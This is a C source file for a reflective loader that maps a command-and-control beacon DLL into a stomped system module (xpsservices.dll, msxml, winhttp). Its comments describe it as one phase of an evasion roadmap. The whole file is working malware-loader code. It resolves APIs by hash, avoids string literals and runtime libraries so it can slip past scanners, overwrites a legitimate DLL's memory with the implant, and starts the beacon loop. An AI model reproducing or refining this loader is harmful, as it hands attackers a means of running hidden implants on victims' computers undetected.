/* Phase 4: image-backed reflective loader (UDRL, AceLdr lineage).
 *
 * Contract (reverse-engineered from 4.9.1, docs/EVASION-ROADMAP.md section 14):
 *   - compiled to a COFF object; the client's extract_reflective_loader takes
 *     the FIRST executable section's raw bytes (OBJParser.hasSection(".text")
 *     else the last IMAGE_SCN_MEM_EXECUTE section) and setup_reflective_loader
 *     writes them at the beacon DLL's ReflectiveLoader export (our 5KB INT3
 *     wall). The DOS header is then patched to jump to that export. Therefore
 *     byte 0 of the extracted section IS the runtime entry - it MUST be
 *     ReflectiveLoader, not a static helper. Helpers are __forceinline and
 *     the export lives in .text$aaa so it sorts first.
 *   - at runtime the artifact container holds the patched DLL as a FLAT FILE
 *     copy in memory and calls this export with rcx = that flat copy. The
 *     loader maps the beacon image into a sacrificial module, calls
 *     DllMain(base, DLL_METASPLOIT_ATTACH(4), lpParameter) and NEVER returns
 *     (our DllMain starts the beacon loop on reason 4, not PROCESS_ATTACH).
 *
 * COFF self-containment (OBJExecutableSimple rejects anything else):
 *   - NO string literals (.rdata relocs) - wide names are stack QWORDs, API
 *     names are found by ROR13 hash
 *   - NO CRT - __stosb/__movsb, never memset/memcpy-shaped loops
 *   - NO direct Win32 calls - everything resolved by hash from kernel32
 *
 * Image-backed mapping (AceLdr lineage), not unbacked RWX:
 *   1. PEB-walk kernel32; hash-resolve the APIs
 *   2. LoadLibraryExW a sacrificial system DLL (DONT_RESOLVE_DLL_REFERENCES)
 *   3. RW the sacrificial .text, copy the beacon at natural RVAs
 *   4. reloc + IAT, restore per-section protections
 *   5. DllMain(sc_base, 4, lpParameter) - never returns
 */

#include <windows.h>
#include <intrin.h>

typedef unsigned long long BW_QWORD;
#define QWORD BW_QWORD

#pragma pack(push, 1)

typedef struct {
    WORD  Magic;
    BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    QWORD ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD  MajorOperatingSystemVersion;
    WORD  MinorOperatingSystemVersion;
    WORD  MajorImageVersion;
    WORD  MinorImageVersion;
    WORD  MajorSubsystemVersion;
    WORD  MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD  Subsystem;
    WORD  DllCharacteristics;
    QWORD SizeOfStackReserve;
    QWORD SizeOfStackCommit;
    QWORD SizeOfHeapReserve;
    QWORD SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
} IMG_OPT64;

typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMG_SECTION;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} IMG_DIR_ENTRY;

typedef struct {
    DWORD OriginalFirstThunk;
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;
    DWORD FirstThunk;
} IMG_IMPORT;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} IMG_BASE_RELOC;

typedef struct {
    WORD  PageOffset : 12;
    WORD  Type : 4;
} IMG_RELOC_ENTRY;

#pragma pack(pop)

#define IMG_DIRECTORY_IMPORT   1
#define IMAGE_REL_BASED_DIR64  10

#define BW_H_LOADLIBRARYA  0xEC0E4E8EUL
#define BW_H_GETPROCADDR   0x7C0DFCAAUL
#define BW_H_VIRTUALPROT   0x7946C61BUL
#define BW_H_VIRTUALQUERY  0xA3C8C8AAUL
#define BW_H_LOADLIBEXW    0x0753A512UL
#define BW_H_FREELIBRARY   0x4DC9D5A0UL
#define BW_H_EXITTHREAD    0x60E0CEEFUL
#define BW_H_FLUSHICACHE   0x53120980UL
#define BW_H_GETCURPROC    0x7B8F17E6UL

typedef HMODULE (WINAPI *BW_LOADLIBA)(LPCSTR);
typedef FARPROC (WINAPI *BW_GETPROC)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *BW_VPROT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef SIZE_T  (WINAPI *BW_VQUERY)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef HMODULE (WINAPI *BW_LOADLIBEXW)(LPCWSTR, HANDLE, DWORD);
typedef BOOL    (WINAPI *BW_FREELIB)(HMODULE);
typedef VOID    (WINAPI *BW_EXITTHR)(DWORD);
typedef BOOL    (WINAPI *BW_FLUSH)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *BW_GETCUR)(void);
typedef BOOL    (WINAPI *BW_DLLMAIN)(void *, DWORD, void *);

static __forceinline void * bw_zero(void * dst, SIZE_T n) {
    __stosb((unsigned char *)dst, 0, n);
    return dst;
}

static __forceinline void * bw_copy(void * dst, const void * src, SIZE_T n) {
    __movsb((unsigned char *)dst, (const unsigned char *)src, n);
    return dst;
}

static __forceinline int bw_wieq(const unsigned short * a, const unsigned short * b) {
    while (*a && *b) {
        unsigned short ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 0x20;
        if (cb >= 'A' && cb <= 'Z') cb += 0x20;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

static __forceinline unsigned long bw_hash(const char * s) {
    unsigned long h = 0;
    while (*s) {
        h = (h >> 13) | (h << 19);
        h += (unsigned char)*s++;
    }
    return h;
}

static __forceinline void * bw_peb_ldr_list(void) {
    unsigned long long peb = __readgsqword(0x60);
    unsigned long long ldr = *(unsigned long long *)(peb + 0x18);
    return (void *)(ldr + 0x10);
}

static __forceinline void * bw_find_module(const unsigned short * want) {
    void * head = bw_peb_ldr_list();
    void * cur = *(void **)head;
    while (cur != head) {
        void * base = *(void **)((unsigned char *)cur + 0x30);
        unsigned short * name = *(unsigned short **)((unsigned char *)cur + 0x60);
        if (base != NULL && name != NULL && bw_wieq(name, want))
            return base;
        cur = *(void **)cur;
    }
    return 0;
}

/* IMAGE_EXPORT_DIRECTORY:
 *   +0x14 NumberOfFunctions
 *   +0x18 NumberOfNames
 *   +0x1C AddressOfFunctions   <- the RVA array, NOT +0x14
 *   +0x20 AddressOfNames
 *   +0x24 AddressOfNameOrdinals
 * A first-cut bug treated +0x14 as AddressOfFunctions, so every "resolved"
 * API was kernel32+NumberOfFunctions (the DOS stub). */
static __forceinline void * bw_find_export_hash(void * base, unsigned long want) {
    unsigned char * b = (unsigned char *)base;
    DWORD e_lfanew = *(DWORD *)(b + 0x3C);
    unsigned char * nth = b + e_lfanew;
    DWORD exp_rva = *(DWORD *)(nth + 0x88); /* opt+0x70 = DataDirectory[0] */
    DWORD exp_sz;
    unsigned char * ed;
    DWORD * names;
    WORD * ords;
    DWORD * funcs;
    DWORD nnames, i;

    if (exp_rva == 0)
        return NULL;
    exp_sz = *(DWORD *)(nth + 0x8C);
    ed = b + exp_rva;
    nnames = *(DWORD *)(ed + 0x18);
    funcs = (DWORD *)(b + *(DWORD *)(ed + 0x1C));
    names = (DWORD *)(b + *(DWORD *)(ed + 0x20));
    ords  = (WORD  *)(b + *(DWORD *)(ed + 0x24));
    for (i = 0; i < nnames; i++) {
        char * nm = (char *)(b + names[i]);
        if (bw_hash(nm) == want) {
            DWORD frva = funcs[ords[i]];
            /* forwarder: RVA falls inside the export directory */
            if (frva >= exp_rva && frva < exp_rva + exp_sz)
                return NULL;
            return b + frva;
        }
    }
    return NULL;
}

static __forceinline int bw_process_reloc(unsigned char * image, DWORD size_of_image) {
    DWORD e_lfanew = *(DWORD *)(image + 0x3C);
    IMG_OPT64 * opt = (IMG_OPT64 *)(image + e_lfanew + 24);
    IMG_DIR_ENTRY * rel = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + 5 * sizeof(IMG_DIR_ENTRY));
    IMG_BASE_RELOC * block;
    IMG_BASE_RELOC * end;
    QWORD delta;
    DWORD i;

    if (rel->VirtualAddress == 0 || rel->Size == 0)
        return 1;
    if (opt->ImageBase == (QWORD)(DWORD_PTR)image)
        return 1;

    delta = (QWORD)(DWORD_PTR)image - opt->ImageBase;
    block = (IMG_BASE_RELOC *)(image + rel->VirtualAddress);
    end = (IMG_BASE_RELOC *)((unsigned char *)block + rel->Size);

    while (block < end && block->Size > 0) {
        IMG_RELOC_ENTRY * entries = (IMG_RELOC_ENTRY *)((unsigned char *)block + sizeof(IMG_BASE_RELOC));
        DWORD count = (block->Size - sizeof(IMG_BASE_RELOC)) / sizeof(IMG_RELOC_ENTRY);
        DWORD page = block->VirtualAddress;
        for (i = 0; i < count; i++) {
            if (entries[i].Type == IMAGE_REL_BASED_DIR64) {
                QWORD * p = (QWORD *)(image + page + entries[i].PageOffset);
                if ((QWORD)(DWORD_PTR)p < (QWORD)(DWORD_PTR)image + size_of_image)
                    *p += delta;
            }
        }
        block = (IMG_BASE_RELOC *)((unsigned char *)block + block->Size);
    }
    return 1;
}

static __forceinline int bw_fill_iat(unsigned char * image, BW_LOADLIBA pLoadLibraryA, BW_GETPROC pGetProcAddress) {
    DWORD e_lfanew = *(DWORD *)(image + 0x3C);
    IMG_OPT64 * opt = (IMG_OPT64 *)(image + e_lfanew + 24);
    IMG_DIR_ENTRY * imp = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + IMG_DIRECTORY_IMPORT * sizeof(IMG_DIR_ENTRY));
    IMG_IMPORT * desc;
    IMG_IMPORT * desc_end;

    if (imp->VirtualAddress == 0)
        return 1;
    desc = (IMG_IMPORT *)(image + imp->VirtualAddress);
    desc_end = (IMG_IMPORT *)((unsigned char *)desc + imp->Size);

    for (; desc < desc_end && desc->Name != 0; desc++) {
        char * dllname = (char *)(image + desc->Name);
        HMODULE hmod = pLoadLibraryA(dllname);
        QWORD * lookup;
        QWORD * thunk;

        if (hmod == NULL)
            return 0;
        lookup = (QWORD *)(image + (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
        thunk  = (QWORD *)(image + desc->FirstThunk);
        for (; *lookup; lookup++, thunk++) {
            QWORD v = *lookup;
            FARPROC fn;
            if (v >> 63)
                fn = pGetProcAddress(hmod, (LPCSTR)(v & 0xFFFF));
            else
                fn = pGetProcAddress(hmod, (LPCSTR)(image + v + 2));
            if (fn == NULL)
                return 0;
            *thunk = (QWORD)(DWORD_PTR)fn;
        }
    }
    return 1;
}

/* Force this body into .text$aaa so it is the first executable section the
 * client's extractor will pick (alphabetical $ suffix, and the only one we
 * emit if the helpers actually inline). */
#pragma code_seg(".text$aaa")

__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
{
    unsigned char * flat;
    unsigned long long kern;
    BW_LOADLIBA    pLoadLibraryA;
    BW_GETPROC     pGetProcAddress;
    BW_VPROT       pVP;
    BW_VQUERY      pVQ;
    BW_LOADLIBEXW  pLLW;
    BW_FREELIB     pFL;
    BW_EXITTHR     pET;
    BW_FLUSH       pFlush;
    BW_GETCUR      pGetCur;
    unsigned char * nth;
    IMG_OPT64 * opt;
    IMG_SECTION * sec;
    DWORD nsec, szopt, i, j;
    DWORD size_of_image;
    unsigned char * sc_base = NULL;
    SIZE_T sc_span = 0;
    int k;
    BW_DLLMAIN dllmain;

    /* this function runs FROM the flat copy (the wall is in .text). Scan
     * backwards page-by-page for the MZ/PE that owns us - that is the
     * container's decode buffer, NOT the host EXE (the EXE sits at a
     * lower address and would only match if we walked past the flat copy). */
    {
        QWORD pc = (QWORD)(DWORD_PTR)&ReflectiveLoader;
        flat = NULL;
        for (j = 0; j < 4096; j++) {
            unsigned char * page = (unsigned char *)(pc & ~0xFFFULL) - (unsigned long long)j * 0x1000;
            if (*(WORD *)page == IMAGE_DOS_SIGNATURE) {
                DWORD lf = *(DWORD *)(page + 0x3C);
                if (lf < 0x1000 && *(DWORD *)(page + lf) == IMAGE_NT_SIGNATURE) {
                    flat = page;
                    break;
                }
            }
        }
        if (flat == NULL)
            return 0;
    }

    nth = flat + *(DWORD *)(flat + 0x3C);
    opt = (IMG_OPT64 *)(nth + 24);
    nsec = *(WORD *)(nth + 6);
    szopt = *(WORD *)(nth + 20);
    sec = (IMG_SECTION *)(nth + 24 + szopt);
    size_of_image = opt->SizeOfImage;

    {
        unsigned short kname[16];
        QWORD * kq = (QWORD *)kname;
        kq[0] = 0x006E00720065006BULL;
        kq[1] = 0x00320033006C0065ULL;
        kq[2] = 0x006C006C0064002EULL;
        kq[3] = 0x0000000000000000ULL;
        kern = (unsigned long long)bw_find_module(kname);
    }
    if (kern == 0)
        return 0;

    pLoadLibraryA   = (BW_LOADLIBA)  bw_find_export_hash((void *)kern, BW_H_LOADLIBRARYA);
    pGetProcAddress = (BW_GETPROC)   bw_find_export_hash((void *)kern, BW_H_GETPROCADDR);
    pVP             = (BW_VPROT)     bw_find_export_hash((void *)kern, BW_H_VIRTUALPROT);
    pVQ             = (BW_VQUERY)    bw_find_export_hash((void *)kern, BW_H_VIRTUALQUERY);
    pLLW            = (BW_LOADLIBEXW)bw_find_export_hash((void *)kern, BW_H_LOADLIBEXW);
    pFL             = (BW_FREELIB)   bw_find_export_hash((void *)kern, BW_H_FREELIBRARY);
    pET             = (BW_EXITTHR)   bw_find_export_hash((void *)kern, BW_H_EXITTHREAD);
    pFlush          = (BW_FLUSH)     bw_find_export_hash((void *)kern, BW_H_FLUSHICACHE);
    pGetCur         = (BW_GETCUR)    bw_find_export_hash((void *)kern, BW_H_GETCURPROC);
    if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVP == NULL ||
        pVQ == NULL || pLLW == NULL)
        return 0;

    /* Map at the sacrificial HMODULE, not at its .text. RtlPcToFileHeader /
     * PEB walks still report the real module base; if we handed DllMain a
     * .text pointer, every RVA the beacon applies is 0x1000 too high and
     * leftover original code (xpsservices EP at +0x1cf3e0, past our 0x67000
     * overlay) stays PAGE_READWRITE - BEX64 DEP at 0x1d29d8 on the last
     * dump. AceLdr copies the implant at the module base for this reason.
     * Candidates must have SizeOfImage > beacon SizeOfImage. */
    for (k = 0; k < 4; k++) {
        unsigned short wname[28];
        QWORD * wq = (QWORD *)wname;
        unsigned char * cand;
        unsigned char * cand_nth;
        IMG_OPT64 * cand_opt;
        MEMORY_BASIC_INFORMATION mbi;
        HMODULE h;
        DWORD cand_soi;

        wq[0] = 0; wq[1] = 0; wq[2] = 0; wq[3] = 0;
        if (k == 0) {        /* xpsservices.dll  SizeOfImage 0x2bc000 */
            wq[0] = 0x0073007300700078ULL; wq[1] = 0x0069007600720065ULL;
            wq[2] = 0x002E007300650063ULL; wq[3] = 0x0000006C006C0064ULL;
        } else if (k == 1) { /* msxml6.dll       SizeOfImage 0x261000 */
            wq[0] = 0x006D00780073006DULL; wq[1] = 0x0064002E0036006CULL;
            wq[2] = 0x00000000006C006CULL; wq[3] = 0x0000000000000000ULL;
        } else if (k == 2) { /* msxml3.dll       SizeOfImage 0x20c000 */
            wq[0] = 0x006D00780073006DULL; wq[1] = 0x0064002E0033006CULL;
            wq[2] = 0x00000000006C006CULL; wq[3] = 0x0000000000000000ULL;
        } else {             /* winhttp.dll      SizeOfImage 0x10d000 */
            wq[0] = 0x0068006E00690077ULL; wq[1] = 0x002E007000740074ULL;
            wq[2] = 0x0000006C006C0064ULL; wq[3] = 0x0000000000000000ULL;
        }
        wname[27] = 0;

        h = pLLW(wname, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (h == NULL)
            continue;
        cand = (unsigned char *)h;
        if (cand == flat) {
            if (pFL) pFL(h);
            continue;
        }
        cand_nth = cand + *(DWORD *)(cand + 0x3C);
        if (*(DWORD *)cand_nth != IMAGE_NT_SIGNATURE) {
            if (pFL) pFL(h);
            continue;
        }
        cand_opt = (IMG_OPT64 *)(cand_nth + 24);
        cand_soi = cand_opt->SizeOfImage;
        if (cand_soi < size_of_image) {
            if (pFL) pFL(h);
            continue;
        }
        if (!pVQ(cand, &mbi, sizeof(mbi)) ||
            mbi.State != MEM_COMMIT ||
            mbi.AllocationBase != cand) {
            if (pFL) pFL(h);
            continue;
        }
        sc_base = cand;
        sc_span = cand_soi;
        break;
    }
    if (sc_base == NULL || sc_base == flat)
        return 0;

    /* Flip every committed page covering [base, base+SizeOfImage) to RW.
     * VirtualProtect on a span larger than one region fails silently and
     * leaves the original RX/R/RW mix, so walk with VirtualQuery. */
    {
        unsigned char * p = sc_base;
        unsigned char * end = sc_base + size_of_image;
        while (p < end) {
            MEMORY_BASIC_INFORMATION mbi;
            DWORD oldp = 0;
            SIZE_T chunk;
            if (!pVQ(p, &mbi, sizeof(mbi)))
                return 0;
            chunk = (SIZE_T)((unsigned char *)mbi.BaseAddress + mbi.RegionSize - p);
            if (p + chunk > end)
                chunk = (SIZE_T)(end - p);
            if (!pVP(p, chunk, PAGE_READWRITE, &oldp))
                return 0;
            p += chunk;
        }
    }

    bw_zero(sc_base, size_of_image);
    bw_copy(sc_base, flat, opt->SizeOfHeaders);
    for (i = 0; i < nsec; i++) {
        if (sec[i].SizeOfRawData == 0)
            continue;
        bw_copy(sc_base + sec[i].VirtualAddress,
                flat + sec[i].PointerToRawData,
                sec[i].SizeOfRawData);
    }

    if (!bw_process_reloc(sc_base, size_of_image))
        return 0;
    if (!bw_fill_iat(sc_base, pLoadLibraryA, pGetProcAddress))
        return 0;

    for (i = 0; i < nsec; i++) {
        DWORD prot, oldp = 0, chars = sec[i].Characteristics;
        SIZE_T psz = sec[i].VirtualSize ? sec[i].VirtualSize : sec[i].SizeOfRawData;
        if (chars & 0x20000000)
            prot = PAGE_EXECUTE_READ;
        else if (chars & 0x80000000)
            prot = PAGE_READWRITE;
        else
            prot = PAGE_READONLY;
        pVP(sc_base + sec[i].VirtualAddress, psz, prot, &oldp);
    }
    {
        DWORD oldp = 0;
        pVP(sc_base, opt->SizeOfHeaders, PAGE_READONLY, &oldp);
    }

    if (pFlush && pGetCur)
        pFlush(pGetCur(), NULL, 0);

    /* reason 4 = DLL_METASPLOIT_ATTACH: our DllMain starts beacon() here
     * and is contracted never to return. ExitThread is the last fence. */
    dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
    dllmain((void *)sc_base, 4, lpParameter);
    if (pET != NULL)
        pET(0);
    return (ULONG_PTR)(DWORD_PTR)sc_base;
}

#pragma code_seg()
